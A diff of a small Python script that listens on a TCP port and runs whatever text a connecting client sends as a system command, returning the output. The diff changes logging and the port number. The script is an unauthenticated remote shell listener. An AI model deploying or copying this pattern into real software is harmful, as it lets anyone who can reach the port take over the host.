@@ -1,6 +1,10 @@
 import socket
 import subprocess
 from datetime import datetime
+import logging
+
+
+logger = logging.getLogger(__name__)
 
 
 def main(port=23333):
@@ -10,13 +14,11 @@ def main(port=23333):
 
     while True:
         client_socket, addr = server_socket.accept()
-        print(f"Connection from {addr} has been established.")
+        logger.info(f"Connection from {addr} has been established.")
 
         while True:
             data = client_socket.recv(1024).decode("utf-8")
-            if data == "":
-                continue
-            elif data == "exit":
+            if data == "exit":
                 break
             try:
                 output = subprocess.check_output(
@@ -25,7 +27,7 @@ def main(port=23333):
                 client_socket.send(output)
             except subprocess.CalledProcessError as e:
                 error_msg = f"{datetime.now()} | Failed to execute command: {data}\n{e.output.decode('utf-8')}"
-                print(error_msg)
+                logger.error(error_msg)
                 client_socket.send(error_msg.encode("utf-8"))
 
         client_socket.close()
@@ -34,4 +36,4 @@ def main(port=23333):
 
 
 if __name__ == "__main__":
-    main()
+    main(22222)
